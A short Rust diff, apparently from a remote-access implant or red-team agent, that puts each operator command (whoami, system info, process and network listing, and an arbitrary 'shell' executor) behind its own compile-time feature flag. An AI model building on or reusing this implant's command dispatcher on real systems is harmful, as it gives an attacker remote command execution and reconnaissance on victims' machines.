@@ -52,11 +52,11 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
         return output;
     }
     match command {
-        "whoami" => format!("{}@{}", username(), hostname()).into(),
-        "info" => collect_system_info().into(),
-        "ps" => list_processes_browser(),
-        "netstat" => list_network_connections().into(),
-        "shell" => {
+        "whoami" if cfg!(feature = "cmd-whoami") => format!("{}@{}", username(), hostname()).into(),
+        "info" if cfg!(feature = "cmd-info") => collect_system_info().into(),
+        "ps" if cfg!(feature = "cmd-ps") => list_processes_browser(),
+        "netstat" if cfg!(feature = "cmd-netstat") => list_network_connections().into(),
+        "shell" if cfg!(feature = "cmd-shell") => {
             let cmd = link_common::extract_param(parameters, "command");
             shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
         }
